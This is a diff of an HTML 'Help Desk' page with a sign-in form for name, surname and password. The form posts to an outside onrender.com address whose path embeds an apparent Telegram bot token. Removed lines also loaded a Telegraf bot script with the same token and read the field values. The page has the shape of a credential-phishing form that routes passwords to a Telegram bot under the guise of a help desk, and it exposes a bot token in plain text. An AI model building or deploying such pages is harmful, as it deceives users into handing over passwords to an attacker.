@@ -1,129 +1,136 @@
 <!-- @format -->
 
-<style>
-  /** @format */
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Help Desk</title>
+  </head>
+  <!-- @format -->
 
-  @import url("https://fonts.googleapis.com/css?family=Montserrat:400,800");
+  <style>
+    /** @format */
 
-  * {
-    box-sizing: border-box;
-  }
+    @import url("https://fonts.googleapis.com/css?family=Montserrat:400,800");
 
-  body {
-    background: #f6f5f7;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-    font-family: "Montserrat", sans-serif;
-    height: 100vh;
-    margin: -20px 0 50px;
-  }
+    * {
+      box-sizing: border-box;
+    }
 
-  h1 {
-    font-weight: bold;
-    margin: 0;
-  }
+    body {
+      background: #f6f5f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      font-family: "Montserrat", sans-serif;
+      height: 100vh;
+      margin: -20px 0 50px;
+    }
 
-  h2 {
-    text-align: center;
-  }
+    h1 {
+      font-weight: bold;
+      margin: 0;
+    }
 
-  p {
-    font-size: 14px;
-    font-weight: 100;
-    line-height: 20px;
-    letter-spacing: 0.5px;
-    margin: 20px 0 30px;
-  }
+    h2 {
+      text-align: center;
+    }
 
-  span {
-    font-size: 12px;
-  }
+    p {
+      font-size: 14px;
+      font-weight: 100;
+      line-height: 20px;
+      letter-spacing: 0.5px;
+      margin: 20px 0 30px;
+    }
 
-  a {
-    color: #333;
-    font-size: 14px;
-    text-decoration: none;
-    margin: 15px 0;
-  }
+    span {
+      font-size: 12px;
+    }
 
-  button {
-    border-radius: 20px;
-    border: 1px solid #2b5dff;
-    background-color: #2bc3ff;
-    background: -webkit-linear-gradient(to right, #2bb1ff, #ff416c);
-    background: linear-gradient(to right, #338cb6, #419aff);
-    color: #ffffff;
-    font-size: 12px;
-    font-weight: bold;
-    padding: 12px 45px;
-    letter-spacing: 1px;
-    text-transform: uppercase;
-    transition: transform 80ms ease-in;
-  }
+    a {
+      color: #333;
+      font-size: 14px;
+      text-decoration: none;
+      margin: 15px 0;
+    }
 
-  button:active {
-    transform: scale(0.95);
-  }
+    button {
+      border-radius: 20px;
+      border: 1px solid #2b5dff;
+      background-color: #2bc3ff;
+      background: -webkit-linear-gradient(to right, #2bb1ff, #ff416c);
+      background: linear-gradient(to right, #338cb6, #419aff);
+      color: #ffffff;
+      font-size: 12px;
+      font-weight: bold;
+      padding: 12px 45px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      transition: transform 80ms ease-in;
+    }
 
-  button:focus {
-    outline: none;
-  }
+    button:active {
+      transform: scale(0.95);
+    }
 
-  button.ghost {
-    background-color: transparent;
-    border-color: #ffffff;
-  }
+    button:focus {
+      outline: none;
+    }
 
-  form {
-    background-color: #ffffff;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-direction: column;
-    padding: 0 50px;
-    height: 100%;
-    text-align: center;
-  }
+    button.ghost {
+      background-color: transparent;
+      border-color: #ffffff;
+    }
 
-  input {
-    background-color: #eee;
-    border: none;
-    padding: 12px 15px;
-    margin: 8px 0;
-    width: 100%;
-  }
+    form {
+      background-color: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      padding: 0 50px;
+      height: 100%;
+      text-align: center;
+    }
 
-  .container {
-    background-color: #fff;
-    border-radius: 10px;
-    box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
-    position: relative;
-    overflow: hidden;
-    width: 768px;
-    max-width: 100%;
-    min-height: 480px;
-  }
-</style>
-<h2>Welcome to our help desk</h2>
-<div class="container" id="container">
-  <div class="form-container sign-in-container">
-    <form
-      action="https://help-desk-cs11.onrender.com/bot_6212965476:AAEcdh4ZBnCoqWx2v6YYIvRMcMj7Fry7rAU"
-      method="POST">
-      <input type="text" id="name" placeholder="Name" />
-      <input type="text" id="surname" placeholder="Surname" />
-      <input type="password" id="password" placeholder="Password" />
-      <a href="#">Forgot your password?</a>
-      <button type="submit">Sign In</button>
-    </form>
-  </div>
-</div>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/telegraf/1.1.1/telegraf.min.js"></script>
-<script>
-  const bot = new Telegraf("6212965476:AAEcdh4ZBnCoqWx2v6YYIvRMcMj7Fry7rAU");
-  const name = document.getElementById("name").value;
-  const surname = document.getElementById("surname").value;
-  const password = document.getElementById("password").value;
-</script>
+    input {
+      background-color: #eee;
+      border: none;
+      padding: 12px 15px;
+      margin: 8px 0;
+      width: 100%;
+    }
+
+    .container {
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25),
+        0 10px 10px rgba(0, 0, 0, 0.22);
+      position: relative;
+      overflow: hidden;
+      width: 768px;
+      max-width: 100%;
+      min-height: 480px;
+    }
+  </style>
+  <body>
+    <h2>Welcome to our help desk</h2>
+    <div class="container" id="container">
+      <div class="form-container sign-in-container">
+        <form
+          action="https://help-desk-cs11.onrender.com/bot_6212965476:AAEcdh4ZBnCoqWx2v6YYIvRMcMj7Fry7rAU"
+          method="POST">
+          <input type="text" id="name" placeholder="Name" />
+          <input type="text" id="surname" placeholder="Surname" />
+          <input type="password" id="password" placeholder="Password" />
+          <a href="#">Forgot your password?</a>
+          <button type="submit">Sign In</button>
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
